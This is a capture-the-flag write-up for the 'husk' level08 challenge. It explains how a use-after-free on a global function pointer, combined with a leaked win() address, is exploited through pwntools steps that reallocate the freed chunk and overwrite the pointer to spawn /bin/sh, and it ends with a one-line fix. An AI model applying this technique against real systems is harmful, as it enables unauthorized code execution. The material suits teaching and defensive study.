# HUSK level08 - Exploit Writeup

## Challenge Overview

**Binary**: `husk` (ELF 64-bit ARM aarch64, dynamically linked, not stripped)  
**Vulnerability**: Use-After-Free (UAF) on global function pointer  
**Goal**: Execute `win()` → `system("/bin/sh")` → get shell → read flag

---

## Source Code Analysis

### Key Data Structures

```c
struct fmt_ops {
    void (*emit)(const char *);  // 8-byte function pointer (ARM64)
};

static struct fmt_ops *g_ops;           // Global function pointer table
static char *notes[MAX_NOTES];          // Array of 16 note pointers
```

### Vulnerable Functions

| Function | Code | Vulnerability |
|----------|------|---------------|
| `cmd_reset()` | `free(g_ops);` | **Frees `g_ops` but doesn't set to NULL** → dangling pointer |
| `cmd_new()` | `notes[i] = malloc(sizeof(struct fmt_ops));` | Allocates **exactly 8 bytes** (size of `fmt_ops`) |
| `cmd_write()` | `read(STDIN_FILENO, notes[i], sizeof(struct fmt_ops));` | Writes **8 bytes** into note |
| `cmd_format()` | `g_ops->emit("husk");` | **Calls through dangling pointer** |

### Information Leak

```c
printf("[HUSK] codec @ %p\n", (void *)win);
```
At startup, the binary **leaks the address of `win()`** which calls `system("/bin/sh")`.

---

## Vulnerability: Use-After-Free

### Root Cause

```c
static void cmd_reset(void) {
    free(g_ops);           // Frees the heap chunk
    puts("[HUSK] format engine reset.");
    // g_ops is NOT set to NULL!
}
```

After `free(g_ops)`:
- The heap chunk is returned to the allocator's free list
- `g_ops` still points to the **freed memory** → **dangling pointer**

### Why It's Exploitable

```c
static void cmd_new(void) {
    notes[i] = malloc(sizeof(struct fmt_ops));  // Allocates 8 bytes
}
```

- `sizeof(struct fmt_ops)` = **8 bytes** (one function pointer)
- `cmd_new()` allocates **exactly the same size** as the freed `g_ops` chunk
- The allocator **reuses the same heap chunk** for `notes[0]`
- Result: `notes[0] == g_ops` (both point to identical memory)

---

## Exploit Strategy

### Memory Layout Visualization

```
INITIAL STATE:
┌────────────────────────────────────────────┐
│ g_ops ──► [Chunk A: fmt_ops {emit=default}]│
└────────────────────────────────────────────┘

STEP 1: cmd_reset() → free(g_ops)
┌────────────────────────────────────────────┐
│ g_ops ──► [FREED Chunk A]  ◄── DANGLING!  │
└────────────────────────────────────────────┘

STEP 2: cmd_new(slot=0) → malloc(8)
┌────────────────────────────────────────────┐
│ notes[0] ──► [Chunk A: fmt_ops {emit=?}]   │
│ g_ops ──────────────────────► [Chunk A]    │  ← SAME ADDRESS!
└────────────────────────────────────────────┘

STEP 3: cmd_write(slot=0, win_addr)
┌────────────────────────────────────────────┐
│ notes[0] ──► [Chunk A: fmt_ops {emit=win}] │
│ g_ops ──────────────────────► [Chunk A]    │  ← g_ops->emit OVERWRITTEN!
└────────────────────────────────────────────┘

STEP 4: cmd_format() → g_ops->emit("husk")
┌────────────────────────────────────────────┐
│ Calls win() → system("/bin/sh") → SHELL!  │
└────────────────────────────────────────────┘
```

---

## Step-by-Step Exploit Walkthrough

### Step 1: Leak `win()` Address

```python
p.recvline()  # "[MATRIX] The husk remains."
p.recvline()  # "[HUSK] Format processor v1.3"
leak_line = p.recvline().strip()  # "\033[0m[HUSK] codec @ 0x4009a8"
win_addr = int(leak_line.split(b'@ ')[1], 16)
```

The banner prints `win()` address directly. No ASLR/PIE bypass needed.

### Step 2: Trigger UAF via `reset` (Option 1)

```python
p.recvuntil(b"> ")
p.send(b'1')  # Calls cmd_reset() → free(g_ops)
```

- `g_ops` is freed but remains pointing to the freed chunk
- Chunk goes into tcache/free list

### Step 3: Reallocate Freed Chunk via `new` (Option 2)

```python
p.recvuntil(b"> ")
p.send(b'2')  # Select "new"
p.recvuntil(b"slot: ")
p.send(b'0')  # Slot 0
```

- `malloc(sizeof(struct fmt_ops))` = `malloc(8)`
- Allocator returns **the same chunk** that `g_ops` pointed to
- Now `notes[0]` and `g_ops` are **aliases** for the same memory

### Step 4: Overwrite Function Pointer via `write` (Option 3)

```python
p.recvuntil(b"> ")
p.send(b'3')  # Select "write"
p.recvuntil(b"slot: ")
p.send(b'0')
p.recvuntil(b"bytes: ")
p.send(p64(win_addr))  # 8 bytes: new emit = win()
```

- Writes `win_addr` into `notes[0]`
- Since `notes[0] == g_ops`, this overwrites `g_ops->emit`
- `g_ops->emit` now points to `win()`

### Step 5: Trigger Shell via `format` (Option 4)

```python
p.recvuntil(b"> ")
p.send(b'4')  # Select "format" → cmd_format()
```

- Executes: `g_ops->emit("husk")`
- But `g_ops->emit == win` now!
- `win()` runs `system("/bin/sh")` → **interactive shell**




## Mitigation That Would Prevent This

| Mitigation | Effect |
|------------|--------|
| `g_ops = NULL` after `free()` | Prevents dangling pointer |


